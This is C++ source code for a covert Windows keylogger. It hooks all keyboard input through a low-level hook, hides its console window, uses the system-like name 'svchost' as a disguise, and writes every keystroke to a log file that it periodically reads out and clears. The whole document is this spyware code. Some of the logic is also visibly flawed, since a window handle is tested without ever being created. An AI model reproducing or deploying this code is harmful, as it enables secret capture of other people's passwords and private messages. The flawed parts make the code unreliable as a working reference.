#include <fstream>
#include <iostream>
#include <string>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <stdio.h>
#include <conio.h>
#include <time.h>
#pragma comment(lib, "ws2_32.lib")
#define DEBUG 1
#define CLASSNAME "winkey"
#define WINDOWTITLE "svchost"
clock_t start = clock();
char windir[MAX_PATH + 1];
HHOOK kbdhook;
bool running;
__declspec(dllexport) LRESULT CALLBACK handlekeys(int code, WPARAM wp, LPARAM lp)
{
    int x = ((clock() - start) / CLOCKS_PER_SEC);
    if (x >= 10) {
        start = clock();
        std::string contents;
        std::FILE* fp = std::fopen("output.txt", "rb");
        if (fp) {

            std::fseek(fp, 0, SEEK_END);
            contents.resize(std::ftell(fp));
            std::rewind(fp);
            std::fread(&contents[0], 1, contents.size(), fp);
            std::fclose(fp);
        }
        std::cout << contents;
        std::ofstream myfile;
        myfile.open("output.txt");
        myfile << "";
        myfile.close();
    }
    if (code == HC_ACTION && (wp == WM_SYSKEYDOWN || wp == WM_KEYDOWN)) {
        static bool capslock = false;
        static bool shift = false;
        char tmp[0xFF] = { 0 };
        std::string str;
        DWORD msg = 1;
        KBDLLHOOKSTRUCT st_hook = *((KBDLLHOOKSTRUCT*)lp);
        bool printable;
        msg += (st_hook.scanCode << 16);
        msg += (st_hook.flags << 24);
        GetKeyNameText(msg, tmp, 0xFF);
        str = std::string(tmp);

        printable = (str.length() <= 1) ? true : false;
        if (!printable) {
            if (str == "CAPSLOCK")
                capslock = !capslock;
            else if (str == "SHIFT")
                shift = true;
            if (str == "ENTER") {
                str = "\n";
                printable = true;
            }
            else if (str == "SPACE") {
                str = " ";
                printable = true;
            }
            else if (str == "TAB") {
                str = "\t";
                printable = true;
            }
            else {
                str = ("<" + str + ">");
            }
        }
        if (printable) {
            if (shift == capslock) { 
            /* Lowercase */
                for (size_t i = 0; i < str.length(); ++i)
                    str[i] = tolower(str[i]);
            }
            else { 
            /* Uppercase */
                for (size_t i = 0; i < str.length(); ++i) {
                    if (str[i] >= 'A' && str[i] <= 'Z') {
                        str[i] = toupper(str[i]);
                    }
                }
            }

            shift = false;
        }

#ifdef DEBUG
        std::cout << str;
#endif
        // Open the output.txt file as output file and write the text in their
        std::ofstream outfile;
        outfile.open("output.txt", std::ios_base::app);
        outfile << str;
        outfile.close();
    }

    return CallNextHookEx(kbdhook, code, wp, lp);
}

LRESULT CALLBACK windowprocedure(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
{
    switch (msg) {
    case WM_CLOSE:
    case WM_DESTROY:
        running = false;
        break;
    default:
        /* Call default message handler */
        return DefWindowProc(hwnd, msg, wp, lp);
    }

    return 0;
}

int WINAPI WinMain(HINSTANCE thisinstance, HINSTANCE previnstance,
    LPSTR cmdline, int ncmdshow)
{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
    HWND hwnd;
    HWND fgwindow = GetForegroundWindow(); /* Current foreground window */
    MSG msg;
    WNDCLASSEX windowclass;
    HINSTANCE modulehandle;
    windowclass.hInstance = thisinstance;
    windowclass.lpszClassName = CLASSNAME;
    windowclass.lpfnWndProc = windowprocedure;
    windowclass.style = CS_DBLCLKS;
    windowclass.cbSize = sizeof(WNDCLASSEX);
    windowclass.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    windowclass.hIconSm = LoadIcon(NULL, IDI_APPLICATION);
    windowclass.hCursor = LoadCursor(NULL, IDC_ARROW);
    windowclass.lpszMenuName = NULL;
    windowclass.cbClsExtra = 0;
    windowclass.cbWndExtra = 0;
    windowclass.hbrBackground = (HBRUSH)COLOR_BACKGROUND;
    if (!(RegisterClassEx(&windowclass)))
        return 1;
    if (!(hwnd))
        return 1;
    modulehandle = GetModuleHandle(NULL);
    kbdhook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)handlekeys, modulehandle, NULL);

    running = true;

    GetWindowsDirectory((LPSTR)windir, MAX_PATH);

    while (running) {
        if (!GetMessage(&msg, NULL, 0, 0))
            running = false;
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}
